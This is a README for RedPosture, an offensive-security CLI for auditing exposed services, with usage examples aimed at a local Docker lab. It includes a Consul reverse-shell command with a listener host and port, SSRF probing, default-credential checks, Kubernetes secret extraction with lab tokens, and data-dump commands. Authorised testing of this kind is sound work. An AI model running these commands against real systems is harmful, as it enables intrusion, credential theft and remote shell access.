# RedPosture

RedPosture is a Python security CLI for:

- exporter discovery / trigger / collect workflows (`exporters`)
- service exposure auditing (`registry`, `grafana`, `gitlab`, `consul`, `kubeapi`, `postgres`, `redis`, `etcd`, `kafka`, `zookeeper`)
- listener-based callback capture for lab SSRF workflows

Use only on systems you own or are explicitly authorized to assess.

## Install

Recommended (`pipx`):

```bash
pipx install "git+https://github.com/MelForze/Redposture.git"
```

Local editable install:

```bash
python -m pip install -e .
```

Python: `3.10+` (project tooling is tested on `3.10-3.13`).

## Quick Help

```bash
redposture --help
redposture exporters -h
redposture registry -h
redposture grafana -h
redposture gitlab -h
redposture consul -h
redposture kubeapi -h
redposture postgres -h
redposture redis -h
redposture etcd -h
redposture kafka -h
redposture zookeeper -h
```

Common flags (most modules):

- `-d, --debug` verbose diagnostics
- `-log <file>` tee output to file
- `-o <file>` save output
- `-f txt|json` output format (`txt` default)

## Docker Lab (Local Testing)

Start lab:

```bash
docker compose -f docker-compose.lab.yml up -d --build
```

## Examples

### Exporters

```bash
# Scan
redposture exporters scan -t 127.0.0.1

# Collect
redposture exporters collect -t 127.0.0.1 --deep

# Trigger (listener mode)
redposture exporters trigger -t 127.0.0.1 --callback-dns host.docker.internal --with-listen
```

### Registry

```bash
# Baseline detect
redposture registry -t 127.0.0.1 --port 15000

# Docker/OCI catalog
redposture registry -t 127.0.0.1 --port 15000 --docker --images

# Tag metadata
redposture registry -t 127.0.0.1 --port 15000 --docker --repository redposture/demo-api --tag latest --metadata
```

### Grafana

```bash
# Baseline
redposture grafana -t 127.0.0.1

# Default creds check
redposture grafana -t 127.0.0.1 --defcreds

# Datasources
redposture grafana -t 127.0.0.1 --defcreds --show-datasources
```

### GitLab

```bash
# Baseline (lab mock)
redposture gitlab -t 127.0.0.1 --port 18080

# Token check
redposture gitlab -t 127.0.0.1 --port 18080 --token glpat-redposture-lab-analyst-2026

# Clone example
redposture gitlab -t 127.0.0.1 --port 18080 --token glpat-redposture-lab-root-2026 --project redposture-lab/public-api --clone
```

### Consul

```bash
# Сбор / dump
redposture consul -t 127.0.0.1 --dump

# SSRF
redposture consul -t 127.0.0.1 --ssrf-target 127.0.0.1 --ssrf-port 3000,9115 --ssrf-path /debug/vars

# Revshell (controlled lab only)
redposture consul -t 127.0.0.1 --revshell --lhost host.docker.internal --lport 4444 --listen
```

Useful follow-ups:

- Check dump auto-prints `script/type/namespace/partition/definition` when available
- Cleanup one check: `redposture consul -t 127.0.0.1 --delete --check-id rev-rp-lab-01`
- ACL lab token file: `docker/consul/output/consul_acl_tokens.env`

### Kubernetes API (`kubeapi`)

```bash
# Lab no-auth proxy (real k3s behind proxy)
redposture kubeapi -t 127.0.0.1 --port 26443 --namespaces --pods

# Auditor token (auth-required endpoint)
redposture kubeapi -t 127.0.0.1 --port 16443 --insecure --token "$(grep '^KUBEAPI_AUDITOR_TOKEN=' docker/kubeapi/output/kubeapi_tokens.env | cut -d= -f2-)" --namespaces --pods

# Admin token (secrets)
redposture kubeapi -t 127.0.0.1 --port 16443 --insecure --token "$(grep '^KUBEAPI_ADMIN_TOKEN=' docker/kubeapi/output/kubeapi_tokens.env | cut -d= -f2-)" --secrets
```

### Postgres

```bash
# Baseline
redposture postgres -t 127.0.0.1

# Default creds check
redposture postgres -t 127.0.0.1 --defcreds

# Basic enum
redposture postgres -t 127.0.0.1 -u postgres -p postgres --show-databases
```

### Redis

```bash
# Baseline
redposture redis -t 127.0.0.1

# Keys
redposture redis -t 127.0.0.1 --show-keys

# Dump
redposture redis -t 127.0.0.1 --dump
```

### etcd

```bash
# Baseline
redposture etcd -t 127.0.0.1

# Keys
redposture etcd -t 127.0.0.1 --show-keys

# Dump
redposture etcd -t 127.0.0.1 --dump
```

### Kafka

```bash
# Baseline
redposture kafka -t 127.0.0.1

# Topics
redposture kafka -t 127.0.0.1 --show-topics

# Topic dump
redposture kafka -t 127.0.0.1 --topic audit.logs --dump
```

### ZooKeeper

```bash
# Baseline
redposture zookeeper -t 127.0.0.1

# Znodes
redposture zookeeper -t 127.0.0.1 --show-znodes

# Dump
redposture zookeeper -t 127.0.0.1 --dump
```

## Development (Optional)

Quick local checks:

```bash
tox
```

Or with a local venv:

```bash
python3 -m venv .venv
./.venv/bin/python -m pip install -e '.[dev]'
./.venv/bin/python -m pytest -q
./.venv/bin/python -m ruff check .
```

## Notes

- `txt` output is terminal-oriented; use `-f json` for parsing.
- Use `-h` on each module for full flag dependencies and edge-case behavior.
- `consul` lab containers are Ubuntu-based in the lab compose to make script-check behavior more realistic.
